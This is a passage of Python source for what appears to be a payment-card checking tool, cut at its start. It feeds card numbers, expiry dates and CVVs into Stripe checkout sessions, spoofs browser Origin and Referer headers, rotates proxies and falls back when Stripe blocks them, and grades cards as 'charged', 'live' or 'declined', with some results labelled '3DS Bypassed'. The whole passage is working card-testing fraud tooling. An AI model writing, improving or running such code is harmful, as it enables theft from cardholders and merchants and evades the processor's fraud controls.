            if status in ("requires_payment_method", "requires_source"):
                error_key = "last_payment_error" if intent_type == "payment_intent" else "last_setup_error"
                last_error = data.get(error_key, {})
                if last_error:
                    result_status, result_msg = _classify_confirm_error(last_error)
                    return result_status, f"{result_msg} (3DS Bypassed)"
                return "declined", f"Payment method failed (3DS Bypassed)"

            if status in ("requires_action", "requires_source_action"):
                if attempt < max_attempts - 1:
                    wait = 1.5 + (attempt * 0.5)
                    await asyncio.sleep(wait)
                    continue
                return None

        except Exception as e:
            logger.warning(f"3DS poll [{context}] error: {e}")
            if attempt < max_attempts - 1:
                await asyncio.sleep(1)

    return None


async def _check_intent_status(client, pk, client_secret, pm_id, intent_type):
    intent_id = client_secret.split("_secret_")[0]

    headers = {
        "User-Agent": UA,
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://js.stripe.com",
        "Referer": "https://js.stripe.com/",
        "Accept": "application/json",
    }

    if intent_type == "payment_intent":
        endpoint = f"{STRIPE_API}/payment_intents/{intent_id}"
    else:
        endpoint = f"{STRIPE_API}/setup_intents/{intent_id}"

    try:
        resp = await client.get(
            f"{endpoint}?client_secret={client_secret}&key={pk}",
            headers=headers,
            timeout=15,
        )
        data = resp.json()
    except Exception as e:
        return "error", f"Intent check failed: {str(e)[:40]}"

    status = data.get("status", "")

    if status == "succeeded":
        return "charged", "Charged Successfully"

    if status == "requires_capture":
        return "charged", "Authorized (Capture Pending)"

    if status == "requires_action":
        return "live", "3DS Authentication Required"

    if status == "requires_payment_method":
        error_key = "last_payment_error" if intent_type == "payment_intent" else "last_setup_error"
        last_error = data.get(error_key, {})
        if last_error:
            return _classify_confirm_error(last_error)
        return "declined", "Payment method failed"

    if status == "processing":
        return "approved", "Processing - Not Yet Confirmed"

    return None


async def stripe_co_check(cc, mm, yy, cvv, checkout_url, session_cache=None, proxy=None):
    start = time.time()

    client_kwargs = {
        "timeout": httpx.Timeout(30),
        "headers": {"User-Agent": UA},
        "follow_redirects": True,
        "proxy": None,
        "trust_env": False,
    }
    if proxy == "NONE":
        pass
    elif proxy:
        client_kwargs["proxy"] = proxy
    else:
        p = _get_proxy()
        if p:
            client_kwargs["proxy"] = p

    async with httpx.AsyncClient(**client_kwargs) as client:
        if session_cache and session_cache.get("pk") and session_cache.get("session_id"):
            info = session_cache
            err = None
        else:
            info, err = await _fetch_checkout_info(client, checkout_url)

        err_str = str(err) if err else ""
        is_proxy_error = err and (
            "407" in err_str or "403" in err_str
            or "Proxy" in err_str or "proxy" in err_str
            or "CONNECT" in err_str or "tunnel" in err_str
            or "Name or service not known" in err_str or "Errno -2" in err_str
            or "getaddrinfo" in err_str or "Connection refused" in err_str
        ) and client_kwargs.get("proxy") is not None
        if is_proxy_error:
            logger.warning(f"Proxy error detected: {err}, retrying without proxy...")

        if err and not is_proxy_error:
            elapsed = round(time.time() - start, 2)
            return "error", f"Error - {err}", None, elapsed, None

        using_proxy = client_kwargs.get("proxy") is not None

        async def _run_confirm(use_client):
            _pk = info["pk"]
            _sid = info["session_id"]
            _amount = info.get("amount")
            if not isinstance(_amount, (int, float)) or _amount is True:
                logger.info(f"Amount missing (value={_amount!r}), re-fetching payment page info...")
                try:
                    pp_headers = {
                        "User-Agent": UA,
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Origin": "https://checkout.stripe.com",
                        "Referer": "https://checkout.stripe.com/",
                        "Accept": "application/json",
                    }
                    pp_resp = await use_client.get(
                        f"{STRIPE_API}/payment_pages/{_sid}?key={_pk}",
                        headers=pp_headers,
                        timeout=15,
                    )
                    pp_data = pp_resp.json()
                    logger.info(f"Re-fetch pp keys: {list(pp_data.keys())[:15]}")
                    if "error" not in pp_data:
                        _amount = _extract_amount_from_pp(pp_data)
                        if isinstance(_amount, (int, float)) and _amount is not True:
                            info["amount"] = int(_amount)
                            logger.info(f"Recovered amount from payment page: {_amount}")
                        else:
                            logger.warning(f"Could not recover amount. mode={pp_data.get('mode')}")
                except Exception as e:
                    logger.warning(f"Amount re-fetch failed: {e}")

            return await _confirm_via_payment_pages(
                use_client, _pk, _sid, None,
                amount=info.get("amount"),
                cc=cc, mm=mm, yy=yy, cvv=cvv,
                stripe_js_version=info.get("stripe_js_version"),
                billing_required=info.get("billing_required", False),
                customer_email=info.get("customer_email"),
                session_info=info,
            )

        if is_proxy_error:
            no_proxy_kwargs = {
                "timeout": httpx.Timeout(30),
                "headers": {"User-Agent": UA},
                "follow_redirects": True,
                "proxy": None,
                "trust_env": False,
            }
            async with httpx.AsyncClient(**no_proxy_kwargs) as fallback_client:
                info, err = await _fetch_checkout_info(fallback_client, checkout_url)
                if err:
                    elapsed = round(time.time() - start, 2)
                    return "error", f"Error - {err}", None, elapsed, None
                status, msg = await _run_confirm(fallback_client)
                elapsed = round(time.time() - start, 2)
                return status, msg, None, elapsed, info

        status, msg = await _run_confirm(client)

        if status == "error" and using_proxy and ("failed" in msg.lower() or "403" in msg.lower()):
            logger.warning(f"Proxy may be blocked by Stripe API ({msg}), retrying without proxy...")
            no_proxy_kwargs = {
                "timeout": httpx.Timeout(30),
                "headers": {"User-Agent": UA},
                "follow_redirects": True,
                "proxy": None,
                "trust_env": False,
            }
            async with httpx.AsyncClient(**no_proxy_kwargs) as fallback_client:
                status, msg = await _run_confirm(fallback_client)

        elapsed = round(time.time() - start, 2)
        return status, msg, None, elapsed, info
